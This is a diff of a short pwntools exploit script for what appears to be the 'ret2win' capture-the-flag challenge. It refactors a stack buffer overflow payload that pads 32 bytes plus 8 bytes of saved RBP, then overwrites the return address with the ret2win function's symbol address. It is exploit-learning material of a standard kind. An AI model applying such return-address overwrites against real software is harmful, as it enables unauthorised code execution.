@@ -22,10 +22,12 @@ r = start()
 
 #========= exploit here ===================
 
-junk = b'A'*32 + b'B'*8
-ret2win = p64(0x00400764)
+junk = b'A'*32 
+rbp = b'B'*8
+ret2win = p64(elf.sym.ret2win)
 
 payload = junk
+payload += rbp
 payload += ret2win
 
 r.sendlineafter('>', payload)
